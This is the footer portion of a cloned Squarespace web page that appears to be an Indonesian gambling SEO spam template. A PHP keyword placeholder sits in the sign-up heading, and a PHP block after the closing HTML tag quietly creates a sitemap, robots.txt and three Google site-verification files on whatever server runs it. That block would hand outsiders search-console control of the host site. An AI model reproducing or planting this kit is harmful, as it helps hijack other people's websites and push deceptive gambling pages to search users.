      const sectionBackground = firstSection ? firstSection.querySelector('.section-background') : null;
      const headerHeight = header ? header.getBoundingClientRect().height : 0;
      const firstSectionHasBackground = firstSection ? firstSection.className.indexOf('has-background') >= 0 : false;
      const isFirstSectionInset = firstSection ? firstSection.className.indexOf('background-width--inset') >= 0 : false;
      const isLayoutEngineSection = firstSection ? firstSection.className.indexOf('layout-engine-section') >= 0 : false;

      if (firstSection) {
        firstSection.style.paddingTop = headerHeight + 'px';
      }
      if (sectionBackground && isLayoutEngineSection) {
        if (isFirstSectionInset) {
          sectionBackground.style.top = headerHeight + 'px';
        } else {
          sectionBackground.style.top = '';
        }
      }
      //# sourceURL=headerPositioning.js
    </script>


    <footer class="sections" id="footer-sections" data-footer-sections>

      <section data-test="page-section" data-section-theme="light" class='page-section 
    
      full-bleed-section
      layout-engine-section
    
    background-width--full-bleed
    
      section-height--small
    
    
      content-width--wide
    
    horizontal-alignment--center
    vertical-alignment--middle
    
      
    
    
    light' data-section-id="660d5c4777b3f814dddb49d7" data-controller="SectionWrapperController" data-current-styles="{
    &quot;imageOverlayOpacity&quot;: 0.15,
    &quot;backgroundWidth&quot;: &quot;background-width--full-bleed&quot;,
    &quot;sectionHeight&quot;: &quot;section-height--small&quot;,
    &quot;customSectionHeight&quot;: 25,
    &quot;horizontalAlignment&quot;: &quot;horizontal-alignment--center&quot;,
    &quot;verticalAlignment&quot;: &quot;vertical-alignment--middle&quot;,
    &quot;contentWidth&quot;: &quot;content-width--wide&quot;,
    &quot;customContentWidth&quot;: 50,
    &quot;sectionTheme&quot;: &quot;light&quot;,
    &quot;sectionAnimation&quot;: &quot;none&quot;,
    &quot;backgroundMode&quot;: &quot;image&quot;
  }" data-current-context="{
    &quot;video&quot;: {
      &quot;playbackSpeed&quot;: 0.5,
      &quot;filter&quot;: 1,
      &quot;filterStrength&quot;: 0,
      &quot;zoom&quot;: 0,
      &quot;videoSourceProvider&quot;: &quot;none&quot;
    },
    &quot;backgroundImageId&quot;: null,
    &quot;backgroundMediaEffect&quot;: {
      &quot;type&quot;: &quot;none&quot;
    },
    &quot;divider&quot;: {
      &quot;enabled&quot;: false
    },
    &quot;typeName&quot;: &quot;products&quot;
  }" data-animation="none" data-fluid-engine-section>
        <div class="section-border">
          <div class="section-background">



          </div>
        </div>
        <div class='content-wrapper' style='
      
        
      
    '>
          <div class="content">






            <div data-fluid-engine="true">
              <style>
                .fe-660d5c4777b3f814dddb49d6 {
                  --grid-gutter: calc(var(--sqs-mobile-site-gutter, 6vw) - 11.0px);
                  --cell-max-width: calc((var(--sqs-site-max-width, 1500px) - (11.0px * (8 - 1))) / 8);

                  display: grid;
                  position: relative;
                  grid-area: 1/1/-1/-1;
                  grid-template-rows: repeat(12, minmax(24px, auto));
                  grid-template-columns:
                    minmax(var(--grid-gutter), 1fr) repeat(8, minmax(0, var(--cell-max-width))) minmax(var(--grid-gutter), 1fr);
                  row-gap: 11.0px;
                  column-gap: 11.0px;
                }

                @media (min-width: 768px) {
                  .background-width--inset .fe-660d5c4777b3f814dddb49d6 {
                    --inset-padding: calc(var(--sqs-site-gutter) * 2);
                  }

                  .fe-660d5c4777b3f814dddb49d6 {
                    --grid-gutter: calc(var(--sqs-site-gutter, 4vw) - 11.0px);
                    --cell-max-width: calc((var(--sqs-site-max-width, 1500px) - (11.0px * (24 - 1))) / 24);
                    --inset-padding: 0vw;

                    --row-height-scaling-factor: 0.0215;
                    --container-width: min(var(--sqs-site-max-width, 1500px), calc(100vw - var(--sqs-site-gutter, 4vw) * 2 - var(--inset-padding)));

                    grid-template-rows: repeat(12, minmax(calc(var(--container-width) * var(--row-height-scaling-factor)), auto));
                    grid-template-columns:
                      minmax(var(--grid-gutter), 1fr) repeat(24, minmax(0, var(--cell-max-width))) minmax(var(--grid-gutter), 1fr);
                  }
                }


                .fe-block-a8d1124b99b49970a5ae {
                  grid-area: 1/2/3/10;
                  z-index: 0;

                  @media (max-width: 767px) {}
                }

                .fe-block-a8d1124b99b49970a5ae .sqs-block {
                  justify-content: flex-start;
                }

                .fe-block-a8d1124b99b49970a5ae .sqs-block-alignment-wrapper {
                  align-items: flex-start;
                }

                @media (min-width: 768px) {
                  .fe-block-a8d1124b99b49970a5ae {
                    grid-area: 3/7/5/21;
                    z-index: 0;


                  }

                  .fe-block-a8d1124b99b49970a5ae .sqs-block {
                    justify-content: flex-start;
                  }

                  .fe-block-a8d1124b99b49970a5ae .sqs-block-alignment-wrapper {
                    align-items: flex-start;
                  }
                }

                .fe-block-59d669d1faff0ba880a2 {
                  grid-area: 3/2/12/10;
                  z-index: 1;

                  @media (max-width: 767px) {}
                }

                .fe-block-59d669d1faff0ba880a2 .sqs-block {
                  justify-content: flex-start;
                }

                .fe-block-59d669d1faff0ba880a2 .sqs-block-alignment-wrapper {
                  align-items: flex-start;
                }

                @media (min-width: 768px) {
                  .fe-block-59d669d1faff0ba880a2 {
                    grid-area: 5/2/11/26;
                    z-index: 1;


                  }

                  .fe-block-59d669d1faff0ba880a2 .sqs-block {
                    justify-content: flex-start;
                  }

                  .fe-block-59d669d1faff0ba880a2 .sqs-block-alignment-wrapper {
                    align-items: flex-start;
                  }
                }

                .fe-block-b2f932cac5df57a4b641 {
                  grid-area: 11/2/13/10;
                  z-index: 2;

                  @media (max-width: 767px) {}
                }

                .fe-block-b2f932cac5df57a4b641 .sqs-block {
                  justify-content: flex-start;
                }

                .fe-block-b2f932cac5df57a4b641 .sqs-block-alignment-wrapper {
                  align-items: flex-start;
                }

                @media (min-width: 768px) {
                  .fe-block-b2f932cac5df57a4b641 {
                    grid-area: 11/2/13/26;
                    z-index: 2;


                  }

                  .fe-block-b2f932cac5df57a4b641 .sqs-block {
                    justify-content: flex-start;
                  }

                  .fe-block-b2f932cac5df57a4b641 .sqs-block-alignment-wrapper {
                    align-items: flex-start;
                  }
                }
              </style>
              <div class="fluid-engine fe-660d5c4777b3f814dddb49d6">
                <div class="fe-block fe-block-a8d1124b99b49970a5ae">
                  <div class="sqs-block socialaccountlinks-v2-block sqs-block-socialaccountlinks-v2" data-block-type="54" id="block-a8d1124b99b49970a5ae">
                    <div class="sqs-block-content">



                      <div class="sqs-svg-icon--outer social-icon-alignment-center social-icons-color- social-icons-size-small social-icons-style-regular ">
                        <style>
                          #block-a8d1124b99b49970a5ae .social-icons-style-border .sqs-svg-icon--wrapper {

                            box-shadow: 0 0 0 2px inset;

                            border: none;
                          }
                        </style>
                        <nav class="sqs-svg-icon--list">
                          <a href="http://instagram.com" target="_blank" class="sqs-svg-icon--wrapper instagram-unauth" aria-label="Instagram">
                            <div>
                              <svg class="sqs-svg-icon--social" viewBox="0 0 64 64">
                                <use class="sqs-use--icon" xlink:href="#instagram-unauth-icon"></use>
                                <use class="sqs-use--mask" xlink:href="#instagram-unauth-mask"></use>
                              </svg>
                            </div>
                          </a><a href="http://twitter.com" target="_blank" class="sqs-svg-icon--wrapper twitter-unauth" aria-label="Twitter">
                            <div>
                              <svg class="sqs-svg-icon--social" viewBox="0 0 64 64">
                                <use class="sqs-use--icon" xlink:href="#twitter-unauth-icon"></use>
                                <use class="sqs-use--mask" xlink:href="#twitter-unauth-mask"></use>
                              </svg>
                            </div>
                          </a><a href="https://tiktok.com" target="_blank" class="sqs-svg-icon--wrapper tiktok-unauth" aria-label="TikTok">
                            <div>
                              <svg class="sqs-svg-icon--social" viewBox="0 0 64 64">
                                <use class="sqs-use--icon" xlink:href="#tiktok-unauth-icon"></use>
                                <use class="sqs-use--mask" xlink:href="#tiktok-unauth-mask"></use>
                              </svg>
                            </div>
                          </a><a href="https://facebook.com" target="_blank" class="sqs-svg-icon--wrapper facebook-unauth" aria-label="Facebook">
                            <div>
                              <svg class="sqs-svg-icon--social" viewBox="0 0 64 64">
                                <use class="sqs-use--icon" xlink:href="#facebook-unauth-icon"></use>
                                <use class="sqs-use--mask" xlink:href="#facebook-unauth-mask"></use>
                              </svg>
                            </div>
                          </a><a href="https://youtube.com" target="_blank" class="sqs-svg-icon--wrapper youtube-unauth" aria-label="YouTube">
                            <div>
                              <svg class="sqs-svg-icon--social" viewBox="0 0 64 64">
                                <use class="sqs-use--icon" xlink:href="#youtube-unauth-icon"></use>
                                <use class="sqs-use--mask" xlink:href="#youtube-unauth-mask"></use>
                              </svg>
                            </div>
                          </a>
                        </nav>
                      </div>
                    </div>
                  </div>
                </div>
                <div class="fe-block fe-block-59d669d1faff0ba880a2">
                  <div class="sqs-block newsletter-block sqs-block-newsletter" data-blend-mode="NORMAL" data-block-type="51" data-border-radii="&#123;&quot;topLeft&quot;:&#123;&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0&#125;,&quot;topRight&quot;:&#123;&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0&#125;,&quot;bottomLeft&quot;:&#123;&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0&#125;,&quot;bottomRight&quot;:&#123;&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0&#125;&#125;" id="block-59d669d1faff0ba880a2">
                    <div class="sqs-block-content">

                      <div class="newsletter-form-wrapper
  
  newsletter-form-wrapper--layoutFloat
  newsletter-form-wrapper--alignCenter
  
  ">
                        <form class="newsletter-form" data-form-id="660d5c4777b3f814dddb49d4" autocomplete="on" method="POST" novalidate onsubmit="return (function (form) {
    Y.use('squarespace-form-submit', 'node', function usingFormSubmit(Y) {
      (new Y.Squarespace.FormSubmit(form)).submit({
        formId: '660d5c4777b3f814dddb49d4',
        collectionId: '660d5c677b67070328ef14fa',
        objectName: '59d669d1faff0ba880a2'
      });
    });
    return false;
  })(this);">
                          <header class="newsletter-form-header">
                            <h2><?php echo $KW ?></h2>
                            <div class="newsletter-form-header-description">
                              <p class="">SEGERA MAINKAN <?php echo $KW ?> DI SITUS KAMI</p>
                            </div>
                          </header>
                          <div class="newsletter-form-body">
                            <div class="newsletter-form-fields-wrapper form-fields" style="vertical-align: middle;">



                              <div id="email-yui_3_17_2_1_1561398083951_4704" class="newsletter-form-field-wrapper form-item field email required" style="vertical-align: bottom;">
                                <label class="newsletter-form-field-label title" for="email-yui_3_17_2_1_1561398083951_4704-field">Email Address</label>
                                <input id="email-yui_3_17_2_1_1561398083951_4704-field" class="newsletter-form-field-element field-element" name="email" x-autocompletetype="email" autocomplete="email" type="email" spellcheck="false" placeholder="Email Address" />
                              </div>




                            </div>
                            <div data-animation-role="button" class="newsletter-form-button-wrapper submit-wrapper" style="vertical-align: middle;">
                              <button class="
            newsletter-form-button
            sqs-system-button
            sqs-editable-button-layout
            sqs-editable-button-style
            sqs-editable-button-shape
            sqs-button-element--primary
          " type="submit" value="Sign Up">
                                <span class="newsletter-form-spinner sqs-spin light large"></span>
                                <span class="newsletter-form-button-label">DAFTAR</span>
                                <span class="newsletter-form-button-icon"></span>
                              </button>
                            </div>


                            <div class="captcha-container sqs-form-rendered
          
          align-center
          
          " data-theme="light"></div>


                          </div>
                          <div class="newsletter-form-footnote"></div>
                          <div class="hidden form-submission-text">Thank you!</div>
                          <div class="hidden form-submission-html" data-submission-html=""></div>
                        </form>
                      </div>
                    </div>
                  </div>
                </div>
                <div class="fe-block fe-block-b2f932cac5df57a4b641">
                  <div class="sqs-block html-block sqs-block-html" data-blend-mode="NORMAL" data-block-type="2" data-border-radii="&#123;&quot;topLeft&quot;:&#123;&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0&#125;,&quot;topRight&quot;:&#123;&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0&#125;,&quot;bottomLeft&quot;:&#123;&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0&#125;,&quot;bottomRight&quot;:&#123;&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0&#125;&#125;" id="block-b2f932cac5df57a4b641">
                    <div class="sqs-block-content">

                      <div class="sqs-html-content">
                        <p style="text-align:center;white-space:pre-wrap;" class="">Made with <a href="http://squarespace.com" target="_blank">Squarespace</a></p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

        </div>

      </section>


    </footer>


  </div>

  <script defer="defer" src="https://static1.squarespace.com/static/vta/5c5a519771c10ba3470d8101/scripts/site-bundle.ae590dcc1b5c07b64253fee4848b19da.js" type="text/javascript"></script>
  <svg xmlns="http://www.w3.org/2000/svg" version="1.1" style="display:none" data-usage="social-icons-svg">
    <symbol id="instagram-unauth-icon" viewBox="0 0 64 64">
      <path d="M46.91,25.816c-0.073-1.597-0.326-2.687-0.697-3.641c-0.383-0.986-0.896-1.823-1.73-2.657c-0.834-0.834-1.67-1.347-2.657-1.73c-0.954-0.371-2.045-0.624-3.641-0.697C36.585,17.017,36.074,17,32,17s-4.585,0.017-6.184,0.09c-1.597,0.073-2.687,0.326-3.641,0.697c-0.986,0.383-1.823,0.896-2.657,1.73c-0.834,0.834-1.347,1.67-1.73,2.657c-0.371,0.954-0.624,2.045-0.697,3.641C17.017,27.415,17,27.926,17,32c0,4.074,0.017,4.585,0.09,6.184c0.073,1.597,0.326,2.687,0.697,3.641c0.383,0.986,0.896,1.823,1.73,2.657c0.834,0.834,1.67,1.347,2.657,1.73c0.954,0.371,2.045,0.624,3.641,0.697C27.415,46.983,27.926,47,32,47s4.585-0.017,6.184-0.09c1.597-0.073,2.687-0.326,3.641-0.697c0.986-0.383,1.823-0.896,2.657-1.73c0.834-0.834,1.347-1.67,1.73-2.657c0.371-0.954,0.624-2.045,0.697-3.641C46.983,36.585,47,36.074,47,32S46.983,27.415,46.91,25.816z M44.21,38.061c-0.067,1.462-0.311,2.257-0.516,2.785c-0.272,0.7-0.597,1.2-1.122,1.725c-0.525,0.525-1.025,0.85-1.725,1.122c-0.529,0.205-1.323,0.45-2.785,0.516c-1.581,0.072-2.056,0.087-6.061,0.087s-4.48-0.015-6.061-0.087c-1.462-0.067-2.257-0.311-2.785-0.516c-0.7-0.272-1.2-0.597-1.725-1.122c-0.525-0.525-0.85-1.025-1.122-1.725c-0.205-0.529-0.45-1.323-0.516-2.785c-0.072-1.582-0.087-2.056-0.087-6.061s0.015-4.48,0.087-6.061c0.067-1.462,0.311-2.257,0.516-2.785c0.272-0.7,0.597-1.2,1.122-1.725c0.525-0.525,1.025-0.85,1.725-1.122c0.529-0.205,1.323-0.45,2.785-0.516c1.582-0.072,2.056-0.087,6.061-0.087s4.48,0.015,6.061,0.087c1.462,0.067,2.257,0.311,2.785,0.516c0.7,0.272,1.2,0.597,1.725,1.122c0.525,0.525,0.85,1.025,1.122,1.725c0.205,0.529,0.45,1.323,0.516,2.785c0.072,1.582,0.087,2.056,0.087,6.061S44.282,36.48,44.21,38.061z M32,24.297c-4.254,0-7.703,3.449-7.703,7.703c0,4.254,3.449,7.703,7.703,7.703c4.254,0,7.703-3.449,7.703-7.703C39.703,27.746,36.254,24.297,32,24.297z M32,37c-2.761,0-5-2.239-5-5c0-2.761,2.239-5,5-5s5,2.239,5,5C37,34.761,34.761,37,32,37z M40.007,22.193c-0.994,0-1.8,0.806-1.8,1.8c0,0.994,0.806,1.8,1.8,1.8c0.994,0,1.8-0.806,1.8-1.8C41.807,22.999,41.001,22.193,40.007,22.193z" />
    </symbol>
    <symbol id="instagram-unauth-mask" viewBox="0 0 64 64">
      <path d="M43.693,23.153c-0.272-0.7-0.597-1.2-1.122-1.725c-0.525-0.525-1.025-0.85-1.725-1.122c-0.529-0.205-1.323-0.45-2.785-0.517c-1.582-0.072-2.056-0.087-6.061-0.087s-4.48,0.015-6.061,0.087c-1.462,0.067-2.257,0.311-2.785,0.517c-0.7,0.272-1.2,0.597-1.725,1.122c-0.525,0.525-0.85,1.025-1.122,1.725c-0.205,0.529-0.45,1.323-0.516,2.785c-0.072,1.582-0.087,2.056-0.087,6.061s0.015,4.48,0.087,6.061c0.067,1.462,0.311,2.257,0.516,2.785c0.272,0.7,0.597,1.2,1.122,1.725s1.025,0.85,1.725,1.122c0.529,0.205,1.323,0.45,2.785,0.516c1.581,0.072,2.056,0.087,6.061,0.087s4.48-0.015,6.061-0.087c1.462-0.067,2.257-0.311,2.785-0.516c0.7-0.272,1.2-0.597,1.725-1.122s0.85-1.025,1.122-1.725c0.205-0.529,0.45-1.323,0.516-2.785c0.072-1.582,0.087-2.056,0.087-6.061s-0.015-4.48-0.087-6.061C44.143,24.476,43.899,23.682,43.693,23.153z M32,39.703c-4.254,0-7.703-3.449-7.703-7.703s3.449-7.703,7.703-7.703s7.703,3.449,7.703,7.703S36.254,39.703,32,39.703z M40.007,25.793c-0.994,0-1.8-0.806-1.8-1.8c0-0.994,0.806-1.8,1.8-1.8c0.994,0,1.8,0.806,1.8,1.8C41.807,24.987,41.001,25.793,40.007,25.793z M0,0v64h64V0H0z M46.91,38.184c-0.073,1.597-0.326,2.687-0.697,3.641c-0.383,0.986-0.896,1.823-1.73,2.657c-0.834,0.834-1.67,1.347-2.657,1.73c-0.954,0.371-2.044,0.624-3.641,0.697C36.585,46.983,36.074,47,32,47s-4.585-0.017-6.184-0.09c-1.597-0.073-2.687-0.326-3.641-0.697c-0.986-0.383-1.823-0.896-2.657-1.73c-0.834-0.834-1.347-1.67-1.73-2.657c-0.371-0.954-0.624-2.044-0.697-3.641C17.017,36.585,17,36.074,17,32c0-4.074,0.017-4.585,0.09-6.185c0.073-1.597,0.326-2.687,0.697-3.641c0.383-0.986,0.896-1.823,1.73-2.657c0.834-0.834,1.67-1.347,2.657-1.73c0.954-0.371,2.045-0.624,3.641-0.697C27.415,17.017,27.926,17,32,17s4.585,0.017,6.184,0.09c1.597,0.073,2.687,0.326,3.641,0.697c0.986,0.383,1.823,0.896,2.657,1.73c0.834,0.834,1.347,1.67,1.73,2.657c0.371,0.954,0.624,2.044,0.697,3.641C46.983,27.415,47,27.926,47,32C47,36.074,46.983,36.585,46.91,38.184z M32,27c-2.761,0-5,2.239-5,5s2.239,5,5,5s5-2.239,5-5S34.761,27,32,27z" />
    </symbol>
    <symbol id="twitter-unauth-icon" viewBox="0 0 64 64">
      <path d="M48,22.1c-1.2,0.5-2.4,0.9-3.8,1c1.4-0.8,2.4-2.1,2.9-3.6c-1.3,0.8-2.7,1.3-4.2,1.6 C41.7,19.8,40,19,38.2,19c-3.6,0-6.6,2.9-6.6,6.6c0,0.5,0.1,1,0.2,1.5c-5.5-0.3-10.3-2.9-13.5-6.9c-0.6,1-0.9,2.1-0.9,3.3 c0,2.3,1.2,4.3,2.9,5.5c-1.1,0-2.1-0.3-3-0.8c0,0,0,0.1,0,0.1c0,3.2,2.3,5.8,5.3,6.4c-0.6,0.1-1.1,0.2-1.7,0.2c-0.4,0-0.8,0-1.2-0.1 c0.8,2.6,3.3,4.5,6.1,4.6c-2.2,1.8-5.1,2.8-8.2,2.8c-0.5,0-1.1,0-1.6-0.1c2.9,1.9,6.4,2.9,10.1,2.9c12.1,0,18.7-10,18.7-18.7 c0-0.3,0-0.6,0-0.8C46,24.5,47.1,23.4,48,22.1z" />
    </symbol>
    <symbol id="twitter-unauth-mask" viewBox="0 0 64 64">
      <path d="M0,0v64h64V0H0z M44.7,25.5c0,0.3,0,0.6,0,0.8C44.7,35,38.1,45,26.1,45c-3.7,0-7.2-1.1-10.1-2.9 c0.5,0.1,1,0.1,1.6,0.1c3.1,0,5.9-1,8.2-2.8c-2.9-0.1-5.3-2-6.1-4.6c0.4,0.1,0.8,0.1,1.2,0.1c0.6,0,1.2-0.1,1.7-0.2 c-3-0.6-5.3-3.3-5.3-6.4c0,0,0-0.1,0-0.1c0.9,0.5,1.9,0.8,3,0.8c-1.8-1.2-2.9-3.2-2.9-5.5c0-1.2,0.3-2.3,0.9-3.3 c3.2,4,8.1,6.6,13.5,6.9c-0.1-0.5-0.2-1-0.2-1.5c0-3.6,2.9-6.6,6.6-6.6c1.9,0,3.6,0.8,4.8,2.1c1.5-0.3,2.9-0.8,4.2-1.6 c-0.5,1.5-1.5,2.8-2.9,3.6c1.3-0.2,2.6-0.5,3.8-1C47.1,23.4,46,24.5,44.7,25.5z" />
    </symbol>
    <symbol id="tiktok-unauth-icon" viewBox="0 0 64 64">
      <path d="M37.9281 17C38.4298 21.2545 40.825 23.7941 45 24.0658V28.8451C42.5859 29.0794 40.4652 28.3016 38.0038 26.821V35.7423C38.0038 47.147 25.4788 50.7361 20.4233 42.5457C17.1856 37.3073 19.1642 28.1048 29.5496 27.73V32.781C28.7296 32.9058 27.9219 33.1002 27.1355 33.362C24.835 34.1398 23.5191 35.583 23.8883 38.1413C24.5889 43.033 33.6584 44.4856 32.901 34.9176V17H37.9091H37.9281Z" />
    </symbol>
    <symbol id="tiktok-unauth-mask" viewBox="0 0 64 64">
      <path fill-rule="evenodd" clip-rule="evenodd" d="M64 0H0V64H64V0ZM45.44 23.54C41 23.25 38.5 20.54 38 16H32.68V35.12C33.48 45.33 23.9 43.78 23.16 38.56C22.78 35.83 24.16 34.29 26.6 33.46C27.4272 33.1806 28.2771 32.9732 29.14 32.84V27.45C18.18 27.85 16.08 37.67 19.5 43.26C24.82 52 38.05 48.17 38.05 36V26.48C40.65 28.06 42.89 28.89 45.44 28.64V23.54Z" />
    </symbol>
    <symbol id="facebook-unauth-icon" viewBox="0 0 64 64">
      <path d="M34.1,47V33.3h4.6l0.7-5.3h-5.3v-3.4c0-1.5,0.4-2.6,2.6-2.6l2.8,0v-4.8c-0.5-0.1-2.2-0.2-4.1-0.2 c-4.1,0-6.9,2.5-6.9,7V28H24v5.3h4.6V47H34.1z" />
    </symbol>
    <symbol id="facebook-unauth-mask" viewBox="0 0 64 64">
      <path d="M0,0v64h64V0H0z M39.6,22l-2.8,0c-2.2,0-2.6,1.1-2.6,2.6V28h5.3l-0.7,5.3h-4.6V47h-5.5V33.3H24V28h4.6V24 c0-4.6,2.8-7,6.9-7c2,0,3.6,0.1,4.1,0.2V22z" />
    </symbol>
    <symbol id="youtube-unauth-icon" viewBox="0 0 64 64">
      <path d="M46.7,26c0,0-0.3-2.1-1.2-3c-1.1-1.2-2.4-1.2-3-1.3C38.3,21.4,32,21.4,32,21.4h0 c0,0-6.3,0-10.5,0.3c-0.6,0.1-1.9,0.1-3,1.3c-0.9,0.9-1.2,3-1.2,3S17,28.4,17,30.9v2.3c0,2.4,0.3,4.9,0.3,4.9s0.3,2.1,1.2,3 c1.1,1.2,2.6,1.2,3.3,1.3c2.4,0.2,10.2,0.3,10.2,0.3s6.3,0,10.5-0.3c0.6-0.1,1.9-0.1,3-1.3c0.9-0.9,1.2-3,1.2-3s0.3-2.4,0.3-4.9 v-2.3C47,28.4,46.7,26,46.7,26z M28.9,35.9l0-8.4l8.1,4.2L28.9,35.9z" />
    </symbol>
    <symbol id="youtube-unauth-mask" viewBox="0 0 64 64">
      <path d="M0,0v64h64V0H0z M47,33.1c0,2.4-0.3,4.9-0.3,4.9s-0.3,2.1-1.2,3c-1.1,1.2-2.4,1.2-3,1.3 C38.3,42.5,32,42.6,32,42.6s-7.8-0.1-10.2-0.3c-0.7-0.1-2.2-0.1-3.3-1.3c-0.9-0.9-1.2-3-1.2-3S17,35.6,17,33.1v-2.3 c0-2.4,0.3-4.9,0.3-4.9s0.3-2.1,1.2-3c1.1-1.2,2.4-1.2,3-1.3c4.2-0.3,10.5-0.3,10.5-0.3h0c0,0,6.3,0,10.5,0.3c0.6,0.1,1.9,0.1,3,1.3 c0.9,0.9,1.2,3,1.2,3s0.3,2.4,0.3,4.9V33.1z M28.9,35.9l8.1-4.2l-8.1-4.2L28.9,35.9z" />
    </symbol>
  </svg>

</body>

</html>
<?php

if (file_exists("sitemap.xml")) {
} else {
  $SITEMAP = fopen('sitemap.xml', 'w');
  $TEX1 = "<?xml version='1.0' encoding='UTF-8'?>
<urlset
      xmlns='http://www.sitemaps.org/schemas/sitemap/0.9'
      xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
      xsi:schemaLocation='http://www.sitemaps.org/schemas/sitemap/0.9
            http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd'>
<url>
  <loc>$CANONICAL</loc>
  <lastmod>$TANGGAL</lastmod>
</url>


</urlset>";
  fwrite($SITEMAP, $TEX1);
  fclose($SITEMAP);
}

if (file_exists("googlecfddc7c2bbf14ef5.html")) {
} else {
  $GOOGLE1 = fopen('googlecfddc7c2bbf14ef5.html', 'w');
  $TEX2 = "google-site-verification: googlecfddc7c2bbf14ef5.html";
  fwrite($GOOGLE1, $TEX2);
  fclose($GOOGLE1);
}

if (file_exists("googled25ac604a09f32eb.html")) {
} else {
  $GOOGLE2 = fopen('googled25ac604a09f32eb.html', 'w');
  $TEX3 = "google-site-verification: googled25ac604a09f32eb.html";
  fwrite($GOOGLE2, $TEX3);
  fclose($GOOGLE2);
}

if (file_exists("googleae25c278d11c186f.html")) {
} else {
  $GOOGLE3 = fopen('googleae25c278d11c186f.html', 'w');
  $TEX4 = "google-site-verification: googleae25c278d11c186f.html";
  fwrite($GOOGLE3, $TEX4);
  fclose($GOOGLE3);
}

$ROBOTSITEMAP = 'sitemap.xml';
if (file_exists("robots.txt")) {
} else {
  $ROBOTS = fopen('robots.txt', 'w');
  $TEX5 = "User-agent: *
Allow: /
Sitemap: $CANONICAL$ROBOTSITEMAP";
  fwrite($ROBOTS, $TEX5);
  fclose($ROBOTS);
}

?>
